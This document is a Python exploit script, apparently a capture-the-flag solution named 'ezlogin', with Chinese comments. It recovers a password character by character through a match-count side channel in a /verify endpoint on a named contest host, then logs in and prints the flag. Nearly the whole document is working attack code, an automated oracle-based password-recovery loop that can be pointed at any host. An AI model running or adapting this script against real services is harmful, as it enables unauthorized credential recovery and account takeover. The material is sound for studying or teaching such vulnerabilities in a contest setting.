#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ezlogin —— 字符级侧信道恢复密码（仅标准库）

目标: http://wg4j5e363xxpdbf4.neu-nex.fun

漏洞: /verify?password= 返回 `Matched N chars.`，N 是**按位置**逐位比较的命中数
      （不是前缀长度：`xxcr3t` 命中 4 = c/r/3/t 四个位置的字符对）。
      于是可以用"猜前缀长度"的方式逐位扩展：
        count(prefix) == len(prefix)  -> 前缀全对
        count(prefix + c) == len(prefix)+1 -> c 就是下一位
      当 count == len(prefix) 且 success=true 时，整串密码正确。

用法:
  python exp.py                # 自动恢复密码并登录
  python exp.py http://host    # 换实例
"""
import json
import string
import sys
import urllib.parse
import urllib.request

BASE = "http://wg4j5e363xxpdbf4.neu-nex.fun"
ARGS = [a for a in sys.argv[1:] if not a.startswith("--")]
if ARGS:
    BASE = ARGS[0].rstrip("/")

CHARSET = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{};:',.<>/?~`|" + " "


def verify(password):
    q = urllib.parse.urlencode({"password": password})
    try:
        with urllib.request.urlopen(BASE + "/verify?" + q, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:  # 错误密码返回 400
        return e.code, e.read().decode("utf-8", "replace")


def parse(body):
    try:
        d = json.loads(body)
        return d
    except Exception:
        return {}


def oracle(password):
    _, body = verify(password)
    d = parse(body)
    return d.get("error", ""), d


def recover():
    prefix = ""
    while len(prefix) < 64:
        base_err, base = oracle(prefix)
        if base.get("success"):
            return prefix, base
        found = None
        for ch in CHARSET:
            err, d = oracle(prefix + ch)
            if d.get("success"):
                return prefix + ch, d
            m = err.split("Matched ")[-1].split(" ")[0] if "Matched " in err else None
            if m is not None and int(m) == len(prefix) + 1:
                found = ch
                break
        if found is None:
            return prefix, {"error": base_err, "stuck": True}
        prefix += found
        print("  + %r  -> %r (len %d)" % (found, prefix, len(prefix)))
    return prefix, {"error": "too long"}


def main():
    print("[*] target:", BASE)
    status, body = verify("S3cr3t")
    print("[*] probe S3cr3t:", status, body.strip())

    pwd, info = recover()
    print("\n[+] password = %r" % pwd)
    print("[+] server   =", json.dumps(info, ensure_ascii=False))
    if info.get("success"):
        print("[+] FLAG     =", info.get("flag") or info)
    return 0


if __name__ == "__main__":
    sys.exit(main())
